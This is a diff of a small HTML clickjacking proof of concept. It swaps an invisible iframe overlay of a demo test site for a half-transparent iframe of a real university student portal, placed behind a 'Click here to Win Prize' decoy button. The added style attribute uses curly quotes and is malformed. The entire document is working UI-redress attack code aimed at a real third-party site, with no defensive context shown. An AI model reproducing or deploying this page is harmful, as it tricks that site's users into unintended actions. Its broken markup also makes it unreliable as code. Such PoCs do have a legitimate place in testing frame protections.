@@ -1,30 +1,12 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <title>Clickjacking PoC</title>
-<style>
-  body {
-    position: relative;
-  }
-  iframe {
-    width: 100%;
-    height: 100%;
-    position: absolute;
-    top: 0;
-    left: 0;
-    opacity: 0.0001;  /* near-invisible, but still receives the click */
-    z-index: 2;
-  }
-  .decoy-button {
-    position: absolute;
-    top: 300px;    /* adjust to match the real target element's position */
-    left: 300px;   /* adjust to match the real target element's position */
-    z-index: 1;
-  }
-</style>
 </head>
 <body>
-  <input type="button" class="decoy-button" value="Click here to Win Prize" />
-  <iframe src="https://testfire.net/?lang=en"></iframe>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe src="http://student.central.edu.gh/" width=100% height=100% style=”opacity: 0.5;”></iframe>
 </body>
 </html>
+
